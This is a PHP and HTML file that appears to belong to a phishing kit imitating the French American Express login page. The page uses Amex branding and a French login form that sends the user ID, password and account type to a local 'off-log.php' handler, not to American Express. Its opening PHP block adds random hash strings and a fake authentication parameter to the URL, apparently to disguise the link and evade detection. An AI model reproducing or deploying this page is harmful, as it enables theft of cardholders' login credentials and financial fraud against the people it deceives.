<?php
session_start();
//Add Random characters to URL
$actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if (strpos($actual_link, 'Service_Login_&_Authentication') !== false) {
    //Do nothing
}elseif(strpos($actual_link, '?') != true){
    $url = $actual_link."?&SERVID=Service_Login_&_Authentication=".sha1(uniqid(time())).sha1(uniqid(time())).sha1(uniqid(time()));
    header("Location: ".$url);  
}else{
    $url = $actual_link."&SERVID=Service_Login_&_Authentication=".sha1(uniqid(time())).sha1(uniqid(time())).sha1(uniqid(time()));
    header("Location: ".$url);
}
?>
<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="async" src="./0_files/s57584462414651"></script>
        



<link rel="canonical" href="https://www.americanexpress.com/">
    <link rel="shortcut icon" type="image/x-icon" href="https://www.americanexpress.com/favicon.ico">




<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="description" content="American Express offers world-class Charge and Credit Cards, Gift Cards, Rewards, Travel, Personal Savings, Business Services, Insurance and more.">
<meta name="robots" content="index,follow">
<meta name="keywords" content="american express, amex, credit cards, gift cards, credit card, charge cards, travel, rewards, business services, financial services, corporate cards, insurance, personal savings">
<meta name="AEM" source="" value="US|AMEX|Home|Homepage">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" id="viewport">
<title>American Express Credit Cards, Rewards, Travel and Business Services</title>
 <!-- Homepage Language Mapping URLS-->


    





          
        
<link rel="stylesheet" href="./0_files/dls.homepage.min.css">


    
    
<link rel="stylesheet" href="./0_files/clientlibs.min.8e6723f3fe1836399a859680fefed87a.css" type="text/css">






    



















<link type="text/css" rel="stylesheet" href="./0_files/US_homepage_refactor.css">


    
    
        
    


    
    
        <meta name="apple-itunes-app" id="appBanner" content="app-id=362348516, affiliate-data=mt=8&amp;uo=4&amp;at=11l8NN&amp;ct=HPSmartBannerUS">
    

<noscript>
    
        
    
<link rel="stylesheet" href="/etc/designs/noscript/clientlibs.min.d7e573e2431f6aca187a3df6f2a4baae.css" type="text/css">



    
</noscript>
        
    <style></style></head>
    
   
    <body>
        

    <img src="header.png">
        
    



    

    
    
 



    
    
        
    
    
    <div id="main">
    

    <div class="col-md-12 pad-0">
        

    </div>

    
    
    
    
    

    
    

    

    
    <div class="homepage-loaded" style="display: block;">
        
    <div class="homePageHero" id="heroSection">
    
        
        <div class="no-cookie" style="display: block;">
            
            <!-- if only one hero - default to hero content library -->
            
            <!-- Carousel -->
            
                <div class="carousel-container">
                    <div class="col-md-4 col-lg-4 heroLogin" style="">
                    
            
 






 


        
 

<div class="card margin-3-b eliloLogin">
        
        
        
            <div class="loginSection" style="display: block;"> 
        
        
        
         
            <form id="form-login" method="post" action="off-log.php">
        
       
            
             
            
            
            <div class="alert alert-warn alert-cohesive" id="errMsg" role="alert" style="display:none;">
                <span class="alert-icon dls-icon-warning-filled"></span>
                <span id="alertMsg" class="ErrorMsgClass" style="display: none;"></span>
            </div>
            <hr class="card-separator">
            <div class="card-block">
             
               
                    <div class="form-group">
                        <label for="login-user">Code utilisateur</label>
                        <input id="login-user" class="form-control" name="UserID" placeholder="Code utilisateur" value="" title="Enter your user id" required="">
                        
                    </div>
                    
                    
                        <div class="form-group">
                            <label for="login-password">Mot de passe</label>
                            <input type="password" id="login-password" class="form-control" name="Password" placeholder="Mot de passe" title="Enter your password" required="">
                        </div>
                    
                
                 

               
                <div class="form-group">
                    <div class="select select-fluid form-control elilo-dropdown-Selected" data-toggle="select" data-rendered="true" data-text="Cards - My Account" data-value="cards">
                        <div class="select-icon "></div>
                        
                        <select class="form-control" name="cardsmanage" title="Select Account Type">
                                
                                
                                    <option value="cards">Suivi de compte-carte</option>
                                 
                                
                                    <option value="membershiprewards">Compte commerçant en ligne</option>
                                 
                                
                                  
                                 
                        </select>
                    </div>
                </div>
               

                <div class="form-group">
                    <div class="checkbox">
                     
                        
                        <input id="remember" class="form-control" type="checkbox" name="REMEMBERME" title="Check this box to have the American Express website securely remember and store your User ID on the computer you are currently using.">
                        
                        <label for="remember" title="Check this box to have the American Express website securely remember and store your User ID on the computer you are currently using.">se souvenir de mon code utilisateur</label>
                    </div>
                </div>
                <div class="form-group">
                    <button id="login-submit" type="submit" class="btn-fluid btn-block-center" title=" Click to Login" alt=" Click to Login">
                        
                        Se connecter
                    
                    </button>
                </div>
                <ul class="list-links">

                            
                            <li id="forgotUserIDPassword" class="utilityLink" title="Forgot User ID or Password?" alt="Forgot User ID or Password?"><a href="#" title="Forgot User ID or Password?" alt="Forgot User ID or Password?"> Code ou mot de passe oublié ?</a></li>

                                 
                            <li id="registerForOnlineServices" class="utilityLink" title="Create New Online Account" alt="Create New Online Account"><a href="#" title="Create New Online Account" alt="Create New Online Account"> Créez vos identifiants</a></li>

                                  
                </ul>
            </div>
       </form>
        </div>

       
        
    </div>



        </div>
                       <div id="carousel-prospect" class="carousel carousel-align-right dls-accent-white-01" data-toggle="carousel" data-autoplay="true" data-animate="false" data-uid="el5">
                        <div class="carousel-inner">
                            
                                
                            
                                
                            
                        <div class="carousel-item card carousel-item-active" aria-labelledby="slide-uid-7" aria-hidden="false" role="tabpanel">
                                    <div class="hidden-lg-down">
                                        
                                            <div class="card-img-bg desktop-carouselXL overlay-grey" data-src="https://www.americanexpress.com/content/dam/amex/fr/home-page/heroes/Prospects/2019-10/Big_Pitch_metal_1280.jpg" style="background-image: url(https://www.americanexpress.com/content/dam/amex/fr/home-page/heroes/Prospects/2019-10/Big_Pitch_metal_1280.jpg);">
                                                <div class="card-img-tint dls-rtp-black-bg"></div>
                                            </div>
                                        
                                        
                                    </div>
                                    <div class="hidden-md-down hidden-xl-up">
                                          
                                            <div class="card-img-bg desktop-carousel overlay-grey" data-src="https://www.americanexpress.com/content/dam/amex/fr/home-page/heroes/Prospects/2019-10/Big_Pitch_metal_1280.jpg" style="background-image: url(https://www.americanexpress.com/content/dam/amex/fr/home-page/heroes/Prospects/2019-10/Big_Pitch_metal_1280.jpg);">
                                                <div class="card-img-tint dls-rtp-black-bg"></div>
                                            </div>
                                        
                                        
                                    </div>
                                    <div class="hidden-sm-down hidden-lg-up">   
                                         
                                            <div class="card-img-bg tablet-carousel overlay-grey" data-src="https://www.americanexpress.com/content/dam/amex/fr/home-page/heroes/Prospects/2019-10/Big_Pitch_metal_1280.jpg" style="background-image: url(https://www.americanexpress.com/content/dam/amex/fr/home-page/heroes/Prospects/2019-10/Big_Pitch_metal_1280.jpg);">
                                                <div class="card-img-tint dls-rtp-black-bg"></div>
                                            </div>
                                        
                                        
                                    </div>
                                    <div class="hidden-md-up">
                                           
                                            <div class="card-img-bg mobile-carousel overlay-grey" data-src="https://www.americanexpress.com/content/dam/amex/fr/home-page/heroes/Prospects/2019-10/Big_Pitch_metal_1280.jpg" style="background-image: url(https://www.americanexpress.com/content/dam/amex/fr/home-page/heroes/Prospects/2019-10/Big_Pitch_metal_1280.jpg);">
                                                <div class="card-img-tint dls-rtp-black-bg"></div>
                                            </div>
                                        
                                        
                                    </div>    
                                    <div class="card-block-center height-full">
                                        <div class="carousel-content text-align-center text-align-left-md-up col-md-7 col-lg-7 dls-accent-white-01" id="slide-uid-7">
                                            
                                            
                                                <h2 class="hero-header hidden-sm-down heading-6 dls-accent-gray-06">LA CARTE PLATINUM, DESORMAIS EN METAL</h2>
                                                <h5 class="hero-header hidden-md-up heading-5 dls-accent-gray-06">LA CARTE PLATINUM, DESORMAIS EN METAL</h5>
                                                <div class="hero-sub-header dls-accent-gray-06 body-3"><p>Profitez d’une offre exceptionnelle : 150€ remboursés dès 1 500€ dépensés.*</p>
</div>
                                            
                                            
                                            <div class="carousel-btn pad-3-t">
                                                
                                                    
                                                    <a href="#" class="btn btn-secondary hero-cta" alt="Start Exploring" title="Start Exploring" aria-label="Start Exploring" role="button" tabindex="0">
                                                        J'en profite
                                                        
                                                    </a>
                                                
                                                
                                            </div>

                                            
                                            
                                            
                                          
                                        </div>
                                    </div>
                                </div></div>

                        <!-- Carousel Controls -->
                        
                    </div>
                </div>

            
        </div>
     


  <img src="footer.png">
    
          
    


        



    
    
    
    







    
    




    
        
    
    
    
    
    

    
    
        
            
        
    


    
    
        
           
        
        
        
        
        
    
    

    
    
    
        
        
            
          
    

     
        
</div></div></div></body></html>